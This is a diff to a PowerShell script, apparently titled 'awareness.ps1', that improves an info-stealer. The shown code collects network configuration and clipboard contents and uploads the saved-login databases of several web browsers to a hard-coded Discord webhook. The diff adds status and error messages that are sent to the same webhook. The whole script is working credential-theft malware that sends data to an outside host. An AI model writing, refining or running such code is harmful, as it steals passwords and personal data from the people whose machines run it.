@@ -1,5 +1,3 @@
-# Supporting PowerShell Script: awareness.ps1
-
 # Define Discord Webhook URL
 $webhookUrl = "https://discord.com/api/webhooks/1310574631249248297/uINhiPCPEfFgH3NlZ_ioU1tAtGMwYJXfxND5yc-iSrb_a_TAR46kPq6WhTRWZY0r_qdj"
 
@@ -66,9 +64,14 @@ try {
 # Extract Network Configuration
 try {
     $netConfig = Get-NetIPAddress | Out-String
-    Send-PayloadToDiscord -content "Network Configuration:`n$netConfig"
+    if ($netConfig) {
+        Send-PayloadToDiscord -content "Network Configuration:`n$netConfig"
+    } else {
+        Send-PayloadToDiscord -content "No network configuration found."
+    }
 } catch {
     Write-Host "Error extracting network configuration: $_"
+    Send-PayloadToDiscord -content "Error extracting network configuration: $_"
 }
 
 # Extract Clipboard Content
@@ -90,12 +93,15 @@ try {
     foreach ($browser in $browsers) {
         $loginData = "$env:LOCALAPPDATA\$browser\User Data\Default\Login Data"
         if (Test-Path $loginData) {
-            Send-FileToDiscord -filePath $loginData -fileName "$browser_LoginData"
-            Send-PayloadToDiscord -content "Browser: $browser - Login Data file uploaded."
+            $fileName = "$browser_LoginData.sqlite"
+            Send-FileToDiscord -filePath $loginData -fileName $fileName
+        } else {
+            Send-PayloadToDiscord -content "Browser: $browser - No Login Data file found."
         }
     }
 } catch {
     Write-Host "Error extracting browser credentials: $_"
+    Send-PayloadToDiscord -content "Error extracting browser credentials: $_"
 }
 
 # List Files in My Documents
